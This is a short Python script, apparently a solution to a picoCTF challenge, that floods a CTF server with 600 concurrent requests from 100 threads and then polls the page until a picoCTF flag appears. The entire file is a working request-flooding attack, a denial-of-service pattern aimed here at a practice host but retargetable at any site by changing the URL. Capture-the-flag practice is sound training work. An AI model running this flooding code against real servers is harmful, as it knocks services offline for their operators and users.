import re
import time
from concurrent.futures import ThreadPoolExecutor
import requests

url = "http://mysterious-sea.picoctf.net:56599"


def send_request():
    try:
        return requests.get(url, timeout=3)
    except requests.RequestException:
        return None


print("Flooding the server...")
with ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(600):
        executor.submit(send_request)

time.sleep(6)

for _ in range(30):
    r = requests.get(url)
    if "picoCTF" in r.text:
        match = re.search(r"picoCTF\{.*?\}", r.text)
        if match:
            print("Flag:", match.group(0))
            break
    time.sleep(1)
